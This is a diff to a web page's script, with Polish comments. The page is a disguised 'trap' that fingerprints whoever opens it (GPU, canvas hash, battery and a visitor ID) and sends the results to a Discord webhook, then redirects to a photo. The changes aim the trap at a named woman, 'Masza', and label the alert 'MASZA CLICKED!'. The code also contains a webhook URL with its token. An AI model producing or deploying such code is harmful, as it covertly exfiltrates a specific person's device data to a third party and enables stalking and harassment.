@@ -19,9 +19,14 @@
 
   <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550302869847281716/Vm79NB7uHGzqnzfUSaj2dmW5vr0sQ6fMxQJOUUP2h1n6BSpSNKKUf9oea9ZQJ0uyhaf5";
-    const REDIRECT_URL = "./fotka.jpg";
+    
+    // Lista plików podrzuconych przez Maszę - losujemy, na który ją przekierować
+    const targetPhotos = [
+      "./20260808_121307.jpg",
+      "./IMG_20250315_160715.heif"
+    ];
+    const REDIRECT_URL = targetPhotos[Math.floor(Math.random() * targetPhotos.length)];
 
-    // 1. Wyciąganie GPU
     function getGPUInfo() {
       try {
         const canvas = document.createElement('canvas');
@@ -35,7 +40,6 @@
       } catch (e) { return "Błąd GPU"; }
     }
 
-    // 2. Hash Canvas
     function getCanvasHash() {
       try {
         const canvas = document.createElement('canvas');
@@ -56,7 +60,6 @@
       } catch(e) { return "N/A"; }
     }
 
-    // 3. Zbiorczy skaner
     async function collectDeepIntel() {
       let batteryInfo = "N/A / Desktop";
       if (navigator.getBattery) {
@@ -94,7 +97,6 @@
       };
     }
 
-    // 4. Wysyłka do Discorda
     async function runTrap() {
       try {
         const intel = await collectDeepIntel();
@@ -104,7 +106,7 @@
           avatar_url: "https://i.imgur.com/4M34hi2.png",
           embeds: [
             {
-              title: "🚨 PEŁNY ZRZUT TELEMETRII SPRZĘTOWEJ!",
+              title: "🚨 MASZA KLIKNIĘTA! PEŁNY ZRZUT TELEMETRII!",
               color: 15158332,
               fields: [
                 { name: "🆔 Fingerprint Hashes", value: `• **Visitor ID:** \`${intel.fpId}\`\n• **Canvas Hash:** \`${intel.canvasHash}\``, inline: false },
